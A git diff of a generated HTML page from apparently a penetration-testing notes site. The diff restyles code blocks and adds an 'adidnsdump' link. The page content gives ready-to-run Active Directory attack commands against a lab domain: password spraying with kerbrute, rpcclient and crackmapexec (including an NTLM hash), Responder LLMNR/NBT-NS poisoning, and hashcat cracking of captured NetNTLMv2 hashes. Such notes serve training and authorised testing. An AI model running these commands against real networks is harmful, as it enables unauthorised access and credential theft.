@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -17173,24 +17196,30 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <li>Consider your password list.</li>
 </ul>
 <p>From previous section we used kerbrute to build a userlist:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
+</span></code></pre></div></td></tr></table></div>
 <h3 id="kerbrute">kerbrute</h3>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="go">kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_ad_users  Welcome1</span>
-</span></code></pre></div>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="go">kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_ad_users  Welcome1</span>
+</span></code></pre></div></td></tr></table></div>
 <h3 id="rpcclient">rpcclient</h3>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="go">for u in $(cat valid_ad_users);do rpcclient -U &quot;$u%Welcome1&quot; -c &quot;getusername;quit&quot; 172.16.5.5 | grep Authority; done</span>
-</span></code></pre></div>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="go">for u in $(cat valid_ad_users);do rpcclient -U &quot;$u%Welcome1&quot; -c &quot;getusername;quit&quot; 172.16.5.5 | grep Authority; done</span>
+</span></code></pre></div></td></tr></table></div>
 <p>An important consideration is that a valid login is not immediately apparent with rpcclient, with the response Authority Name indicating a successful login. We can filter out invalid login attempts by grepping for Authority in the response. </p>
 <h3 id="crackmapexec">crackmapexec</h3>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="go">sudo crackmapexec smb 172.16.5.5 -u valid_ad_users -p Password123 | grep +</span>
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="gp"># </span>Spraying<span class="w"> </span>password<span class="w"> </span>with<span class="w"> </span>crackmapexec
-</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="go">crackmapexec smb $ip/23 -u /folder/userlist.txt -u administrator -H 88ad09182de639ccc6579eb0849751cf --local-auth --continue-on-success | grep +</span>
-</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="gp"># </span>--continue-on-success:<span class="w">  </span><span class="k">continue</span><span class="w"> </span>spraying<span class="w"> </span>even<span class="w"> </span>after<span class="w"> </span>a<span class="w"> </span>valid<span class="w"> </span>password<span class="w"> </span>is<span class="w"> </span>found.<span class="w"> </span>Useful<span class="w"> </span><span class="k">for</span><span class="w"> </span>spraying<span class="w"> </span>a<span class="w"> </span>single<span class="w"> </span>password<span class="w"> </span>against<span class="w"> </span>a<span class="w"> </span>large<span class="w"> </span>user<span class="w"> </span>list
-</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="gp"># </span>--local-auth:<span class="w">  </span><span class="k">if</span><span class="w"> </span>we<span class="w"> </span>are<span class="w"> </span>targetting<span class="w"> </span>a<span class="w"> </span>non-domain<span class="w"> </span>joined<span class="w"> </span>computer,<span class="w"> </span>we<span class="w"> </span>will<span class="w"> </span>need<span class="w"> </span>to<span class="w"> </span>use<span class="w"> </span>the<span class="w"> </span>option<span class="w"> </span>--local-auth.<span class="w"> </span>The<span class="w"> </span>--local-auth<span class="w"> </span>flag<span class="w"> </span>will<span class="w"> </span>tell<span class="w"> </span>the<span class="w"> </span>tool<span class="w"> </span>only<span class="w"> </span>to<span class="w"> </span>attempt<span class="w"> </span>to<span class="w"> </span>log<span class="w"> </span><span class="k">in</span><span class="w"> </span>one<span class="w"> </span><span class="nb">time</span><span class="w"> </span>on<span class="w"> </span>each<span class="w"> </span>machine<span class="w"> </span>which<span class="w"> </span>removes<span class="w"> </span>any<span class="w"> </span>risk<span class="w"> </span>of<span class="w"> </span>account<span class="w"> </span>lockout.
-</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="gp"># </span>-H:<span class="w"> </span><span class="nb">hash</span>
-</span></code></pre></div>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span>
+<span class="normal"><a href="#__codelineno-3-2">2</a></span>
+<span class="normal"><a href="#__codelineno-3-3">3</a></span>
+<span class="normal"><a href="#__codelineno-3-4">4</a></span>
+<span class="normal"><a href="#__codelineno-3-5">5</a></span>
+<span class="normal"><a href="#__codelineno-3-6">6</a></span>
+<span class="normal"><a href="#__codelineno-3-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="go">sudo crackmapexec smb 172.16.5.5 -u valid_ad_users -p Password123 | grep +</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3"></a><span class="gp"># </span>Spraying<span class="w"> </span>password<span class="w"> </span>with<span class="w"> </span>crackmapexec
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4"></a><span class="go">crackmapexec smb $ip/23 -u /folder/userlist.txt -u administrator -H 88ad09182de639ccc6579eb0849751cf --local-auth --continue-on-success | grep +</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5"></a><span class="gp"># </span>--continue-on-success:<span class="w">  </span><span class="k">continue</span><span class="w"> </span>spraying<span class="w"> </span>even<span class="w"> </span>after<span class="w"> </span>a<span class="w"> </span>valid<span class="w"> </span>password<span class="w"> </span>is<span class="w"> </span>found.<span class="w"> </span>Useful<span class="w"> </span><span class="k">for</span><span class="w"> </span>spraying<span class="w"> </span>a<span class="w"> </span>single<span class="w"> </span>password<span class="w"> </span>against<span class="w"> </span>a<span class="w"> </span>large<span class="w"> </span>user<span class="w"> </span>list
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6"></a><span class="gp"># </span>--local-auth:<span class="w">  </span><span class="k">if</span><span class="w"> </span>we<span class="w"> </span>are<span class="w"> </span>targetting<span class="w"> </span>a<span class="w"> </span>non-domain<span class="w"> </span>joined<span class="w"> </span>computer,<span class="w"> </span>we<span class="w"> </span>will<span class="w"> </span>need<span class="w"> </span>to<span class="w"> </span>use<span class="w"> </span>the<span class="w"> </span>option<span class="w"> </span>--local-auth.<span class="w"> </span>The<span class="w"> </span>--local-auth<span class="w"> </span>flag<span class="w"> </span>will<span class="w"> </span>tell<span class="w"> </span>the<span class="w"> </span>tool<span class="w"> </span>only<span class="w"> </span>to<span class="w"> </span>attempt<span class="w"> </span>to<span class="w"> </span>log<span class="w"> </span><span class="k">in</span><span class="w"> </span>one<span class="w"> </span><span class="nb">time</span><span class="w"> </span>on<span class="w"> </span>each<span class="w"> </span>machine<span class="w"> </span>which<span class="w"> </span>removes<span class="w"> </span>any<span class="w"> </span>risk<span class="w"> </span>of<span class="w"> </span>account<span class="w"> </span>lockout.
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7"></a><span class="gp"># </span>-H:<span class="w"> </span><span class="nb">hash</span>
+</span></code></pre></div></td></tr></table></div>
 <h2 id="llmnrnbt-ns-poisoning">LLMNR/NBT-NS Poisoning</h2>
 <p><a href="../5355-LLMNR/">See more</a>. </p>
 <p><a href="https://datatracker.ietf.org/doc/html/rfc4795">Link-Local Multicast Name Resolution</a> (LLMNR) and <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063(v=technet.10)?redirectedfrom=MSDN">NetBIOS Name Service</a> (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails.</p>
@@ -17232,16 +17261,19 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </table>
 <h3 id="responder">Responder</h3>
 <p>Listening with responder</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>sudo<span class="w"> </span>responder<span class="w"> </span>-I<span class="w"> </span>ens224<span class="w"> </span>-A<span class="w"> </span>-wf
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="c1"># sudo privileges or root to make sure that all ports needed are available on our attack host for it to function best.</span>
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="c1"># -w: The use of the -w flag utilizes the built-in WPAD proxy server. This can be highly effective, especially in large organizations, because it will capture all HTTP requests by any users that launch Internet Explorer if the browser has Auto-detect settings enabled.</span>
-</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="c1"># -f: attempts to fingerprint the remote host operating system and version.</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span>
+<span class="normal"><a href="#__codelineno-4-2">2</a></span>
+<span class="normal"><a href="#__codelineno-4-3">3</a></span>
+<span class="normal"><a href="#__codelineno-4-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>sudo<span class="w"> </span>responder<span class="w"> </span>-I<span class="w"> </span>ens224<span class="w"> </span>-A<span class="w"> </span>-wf
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a><span class="c1"># sudo privileges or root to make sure that all ports needed are available on our attack host for it to function best.</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a><span class="c1"># -w: The use of the -w flag utilizes the built-in WPAD proxy server. This can be highly effective, especially in large organizations, because it will capture all HTTP requests by any users that launch Internet Explorer if the browser has Auto-detect settings enabled.</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4"></a><span class="c1"># -f: attempts to fingerprint the remote host operating system and version.</span>
+</span></code></pre></div></td></tr></table></div>
 <p>With this configuration shown above, Responder will listen and answer any requests it sees on the wire.</p>
 <p>All saved Hashes are located in Responder's logs directory (<code>/usr/share/responder/logs/</code>). </p>
 <p><strong>NetNTLMv2 hashes are very useful once cracked, but cannot be used for techniques such as pass-the-hash</strong>, meaning we have to attempt to crack them offline with <a href="../hashcat/">hashcat</a> or <a href="../john-the-ripper/">johntheripper</a>. For example, in the case of a  NetNTLMv2 hash, we can copy the hash to a file and attempt to crack it using the hashcat module 5600. </p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="go">hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt </span>
-</span></code></pre></div>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="go">hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt </span>
+</span></code></pre></div></td></tr></table></div>
 <p><a href="../hashcat/">See hashcat for other modules beside 5600</a>.</p>
 <blockquote>
 <p>Hashes are also stored in a SQLite database that can be configured in the <code>Responder.conf</code> config file, typically located in <code>/usr/share/responder</code> unless we clone the Responder repo directly from GitHub.</p>
@@ -17321,7 +17353,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../assets/javascripts/bundle.88dd0f4e.min.js"></script>
